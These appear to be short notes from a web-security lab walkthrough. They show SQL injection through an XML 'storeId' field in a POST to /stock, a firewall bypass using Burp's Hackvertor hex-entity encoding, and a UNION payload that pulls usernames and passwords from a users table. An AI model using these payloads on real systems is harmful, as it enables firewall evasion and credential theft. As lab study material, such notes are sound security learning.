1) we can try to inject into the post request to /stock this payload

<storeId>1 UNION SELECT NULL</storeId>

but it is blocked by the firewall

2) we need to encode it:
<storeId><@hex_entities>1 UNION SELECT NULL<@/hex_entities></storeId>

3) with this payload we can get the passwords of the users
<storeId><@hex_entities>1 UNION SELECT username || ':' || password FROM users<@/hex_entities></storeId>



IT WORKS ONLY FOR BURP
<storeId>1 UNION SELECT NULL</storeId> select 1 UNION SELECT NULL -> click on extensions-> hackvector -> encode -> hex_entities
